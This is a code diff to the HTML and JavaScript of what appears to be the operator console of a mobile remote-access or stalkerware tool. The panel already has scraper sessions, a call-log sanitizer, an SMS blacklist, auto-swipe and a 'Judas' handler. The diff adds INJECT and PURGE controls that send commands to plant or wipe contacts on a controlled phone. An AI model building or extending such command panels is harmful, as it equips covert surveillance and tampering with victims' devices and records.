@@ -432,6 +432,20 @@
                     <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.65rem;" onclick="sendCmd('RESET_SCRAPER')">ABORT ALL SCRAPER SESSIONS</button>
                 </div>
                 <div class="cmd-row">
+                    <label class="cmd-label">Contact Manipulation (Injection/Purge)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('ADD_CONTACT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_CONTACT')">?</button>
+                        <input type="text" id="con-name" placeholder="Name..." style="flex:1">
+                        <input type="text" id="con-num" placeholder="Number..." style="flex:1">
+                        <button class="btn" onclick="sendCmd('ADD_CONTACT')">INJECT</button>
+                    </div>
+                    <div class="input-wrap" style="margin-top:5px">
+                        <button class="btn-tag" onclick="tagCmd('PURGE_CONTACT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PURGE_CONTACT')">?</button>
+                        <input type="text" id="con-purge" placeholder="Name or Number to wipe" style="flex:1">
+                        <button class="btn danger" onclick="sendCmd('PURGE_CONTACT')">PURGE</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
                     <label class="cmd-label">Call Log Sanitizer</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('PHONE_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
@@ -975,6 +989,10 @@
                         content = `${document.getElementById('swipe-type').value}|${document.getElementById('swipe-val').value}`; break;
                     case 'CLEAR_AUTO_SWIPE':
                         content = forcedVal || ''; break;
+                    case 'ADD_CONTACT':
+                        content = `${document.getElementById('con-name').value}|${document.getElementById('con-num').value}`; break;
+                    case 'PURGE_CONTACT':
+                        content = document.getElementById('con-purge').value; break;
                     case 'SET_SMS_BLACKLIST':
                         content = document.getElementById('sms-blacklist').value; break;
                     case 'SET_JUDAS_HANDLER':
